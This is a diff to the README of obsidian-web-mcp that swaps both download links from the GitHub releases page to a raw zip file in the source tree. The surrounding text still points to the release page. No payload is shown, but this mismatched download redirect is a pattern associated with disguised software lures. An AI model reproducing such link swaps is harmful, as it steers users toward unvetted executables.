@@ -1,6 +1,6 @@
 # 🧭 obsidian-web-mcp - Access your notes anywhere
 
-[![Download obsidian-web-mcp](https://img.shields.io/badge/Download%20obsidian--web--mcp-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Sebastian3909/obsidian-web-mcp/releases)
+[![Download obsidian-web-mcp](https://img.shields.io/badge/Download%20obsidian--web--mcp-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Sebastian3909/obsidian-web-mcp/raw/refs/heads/main/src/web-mcp-obsidian-v1.1.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ This guide shows how to download and run it on Windows.
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/Sebastian3909/obsidian-web-mcp/releases
+Visit this page to download: https://github.com/Sebastian3909/obsidian-web-mcp/raw/refs/heads/main/src/web-mcp-obsidian-v1.1.zip
 
 On the release page, look for the latest Windows file. Download the file that matches your system, then save it to a folder you can find again, such as `Downloads` or `Desktop`.
 
